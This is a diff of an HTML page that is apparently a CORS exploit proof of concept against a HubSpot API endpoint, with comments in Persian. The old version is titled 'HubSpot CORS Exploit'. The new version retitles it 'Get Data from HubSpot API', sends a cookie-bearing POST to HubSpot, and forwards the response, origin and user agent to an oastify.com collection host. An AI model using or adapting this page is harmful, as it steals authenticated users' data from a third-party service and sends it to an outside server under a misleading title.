@@ -1,22 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HubSpot CORS Exploit - Find Working Endpoints</title>
+    <title>Get Data from HubSpot API</title>
 </head>
 <body>
-
+    <h1>Loading...</h1>
     <script>
-var xhttp = new XMLHttpRequest();
-xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-        alert(this.responseText);
-    }
-};
-xhttp.open("POST", "https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth", true);
-xhttp.withCredentials = true;
-xhttp.send(); 
-</script>
-
-    
+    // ۱. درخواست به API با کوکی‌ها
+    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
+        method: 'POST',
+        credentials: 'include',  // کوکی‌ها همراه درخواست میرن
+        headers: {
+            'Content-Type': 'application/json',
+            'Origin': 'https://zeynaal.github.io'
+        },
+        body: JSON.stringify([{
+            event: 'page_view',
+            properties: {
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            }
+        }])
+    })
+    .then(response => {
+        // ۲. گرفتن پاسخ از سرور
+        console.log('[+] Status:', response.status);
+        return response.text();
+    })
+    .then(data => {
+        // ۳. نمایش داده‌ها در کنسول
+        console.log('[+] Response Data:', data);
+        
+        // ۴. ارسال داده‌ها به Collaborator
+        fetch('https://1hj5ec7i7emkmxloltagwe9sgjmaa0yp.oastify.com', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                response: data,
+                origin: window.location.origin,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            })
+        })
+        .then(() => console.log('[+] Data sent to Collaborator!'))
+        .catch(e => console.log('[-] Error sending to Collaborator:', e));
+    })
+    .catch(error => {
+        console.log('[-] Error:', error);
+        // ارسال خطا به Collaborator
+        fetch('https://1hj5ec7i7emkmxloltagwe9sgjmaa0yp.oastify.com', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                error: error.toString(),
+                origin: window.location.origin
+            })
+        });
+    });
+    </script>
 </body>
 </html>
